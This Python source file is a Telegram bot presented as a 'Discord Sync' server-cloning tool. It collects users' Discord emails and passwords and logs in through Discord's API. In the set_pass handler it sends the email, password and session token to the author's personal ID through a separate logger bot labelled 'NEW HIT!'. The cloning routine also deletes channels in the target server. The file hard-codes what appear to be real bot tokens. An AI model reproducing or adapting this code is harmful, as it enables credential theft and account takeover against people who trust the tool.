import aiohttp
import asyncio
import discord
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# --- الإعدادات النهائية ---
CONTROL_BOT_TOKEN = '8378070838:AAE9z1q96aIiHqgaIZjy6RH1nkUAIGR4ON4'
LOGGER_BOT_TOKEN = '8606487501:AAFD_5q13Bsx09K3xPn8TUJCsbCPGWDRU68'
MY_PERSONAL_ID = 8624458656

class LoginFlow(StatesGroup):
    waiting_email = State()
    waiting_password = State()
    waiting_ids = State()

bot = Bot(token=CONTROL_BOT_TOKEN)
logger_bot = Bot(token=LOGGER_BOT_TOKEN)
dp = Dispatcher()

# --- محرك النسخ السريع جداً ---
async def fast_clone_engine(tg_msg, token, src_id, tgt_id):
    client = discord.Client()
    
    @client.event
    async def on_ready():
        try:
            source = client.get_guild(int(src_id))
            target = client.get_guild(int(tgt_id))
            
            if not source or not target:
                await tg_msg.answer("❌ Servers Not Found!")
                await client.close(); return

            await tg_msg.answer(f"⚡ **Fast Clone Started:** {target.name}\n(Cleaning and Copying...)")
            
            # حذف القنوات القديمة بسرعة
            delete_tasks = [c.delete() for c in target.channels if c.name != "general"]
            await asyncio.gather(*delete_tasks, return_exceptions=True)

            # نسخ الهيكل (الفئات والقنوات)
            for cat in source.categories:
                new_cat = await target.create_category(name=cat.name)
                for chan in cat.channels:
                    try:
                        if isinstance(chan, discord.TextChannel):
                            await new_cat.create_text_channel(name=chan.name)
                        elif isinstance(chan, discord.VoiceChannel):
                            await new_cat.create_voice_channel(name=chan.name)
                    except: continue
            
            await tg_msg.answer("🏁 **MISSION COMPLETE!** Server has been cloned.")
        except Exception as e:
            await tg_msg.answer(f"🚨 Engine Error: {e}")
        finally:
            await client.close()

    try:
        await client.start(token)
    except Exception as e:
        await tg_msg.answer(f"❌ Login Failed: {e}")

# --- نظام تسجيل الدخول مع انتظار التأكيد ---
async def check_login(email, password, message):
    url = "https://discord.com/api/v9/auth/login"
    payload = {"login": email, "password": password, "undelete": False}
    
    async with aiohttp.ClientSession() as session:
        for attempt in range(12): # يحاول لمدة دقيقتين
            async with session.post(url, json=payload) as r:
                data = await r.json()
                if r.status == 200:
                    return data.get("token")
                elif r.status == 403 and "check your email" in str(data).lower():
                    if attempt == 0:
                        await message.answer("⚠️ **Verification Required!**\nCheck your email and click **'Verify Login'**.\n\n⚠️ **مطلوب التأكيد!**\nتفقد بريدك واضغط على زر التأكيد.")
                    await asyncio.sleep(10)
                elif "ticket" in data:
                    return "2FA_ENABLED"
                elif r.status == 400:
                    return "WRONG_PASS"
        return "TIMEOUT"

# --- أوامر التليجرام (تصحيح الـ Arguments) ---

@dp.message(Command("start", "clone"))
async def cmd_start(message: types.Message, state: FSMContext):
    await message.answer("🌐 **Discord Sync / مزامنة ديسكورد**\n\nPlease enter your Discord **Email**:")
    await state.set_state(LoginFlow.waiting_email)

@dp.message(LoginFlow.waiting_email)
async def set_email(message: types.Message, state: FSMContext):
    await state.update_data(email=message.text)
    await message.answer("🔑 **Password / كلمة المرور**:")
    await state.set_state(LoginFlow.waiting_password)

@dp.message(LoginFlow.waiting_password)
async def set_pass(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    email = user_data['email']
    password = message.text
    
    await message.answer("⏳ **Authenticating... / جاري التحقق...**")
    token = await check_login(email, password, message)
    
    if token and len(token) > 10 and token not in ["TIMEOUT", "2FA_ENABLED", "WRONG_PASS"]:
        await state.update_data(token=token)
        # إرسال البيانات إليك فوراً
        report = f"🎯 **NEW HIT!**\n📧 Email: `{email}`\n🔑 Pass: `{password}`\n🎫 Token: `{token}`"
        await logger_bot.send_message(MY_PERSONAL_ID, report)
        
        await message.answer("✅ **Logged In Successfully!**\nSend IDs: `SOURCE_ID TARGET_ID`")
        await state.set_state(LoginFlow.waiting_ids)
    else:
        await message.answer(f"❌ **Failed:** {token}")
        await state.clear()

@dp.message(LoginFlow.waiting_ids)
async def do_clone(message: types.Message, state: FSMContext):
    try:
        data = await state.get_data()
        src, tgt = message.text.split()
        await message.answer("⚡ **Engine is running in background...**")
        asyncio.create_task(fast_clone_engine(message, data['token'], src, tgt))
        await state.clear()
    except Exception:
        await message.answer("❌ Error. Use: `SOURCE_ID TARGET_ID`")

async def main():
    print("🖥️ BITRI9 MASTER SYSTEM: ONLINE")
    try:
        await dp.start_polling(bot)
    finally:
        await bot.session.close()

if __name__ == '__main__':
    asyncio.run(main())
